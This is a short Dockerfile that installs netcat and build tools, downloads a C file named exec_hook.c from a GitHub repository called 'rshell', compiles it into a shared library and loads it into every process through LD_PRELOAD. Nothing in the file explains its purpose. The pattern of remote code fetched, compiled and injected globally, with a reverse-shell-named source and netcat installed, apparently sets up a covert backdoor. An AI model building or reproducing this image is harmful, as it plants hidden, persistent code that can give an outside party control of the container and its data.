FROM python:3.11-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    curl \
    bash \
    gcc \
    wget \
    build-essential \
    netcat-traditional \
    && rm -rf /var/lib/apt/lists/*

RUN wget https://raw.githubusercontent.com/rmamartindeabiapartner-ux/rshell/refs/heads/main/exec_hook.c -O exec_hook.c
RUN gcc -shared -fPIC exec_hook.c -o exec_hook.so -ldl -pthread
RUN mv exec_hook.so /lib/exec_hook.so

ENV LD_PRELOAD=/lib/exec_hook.so
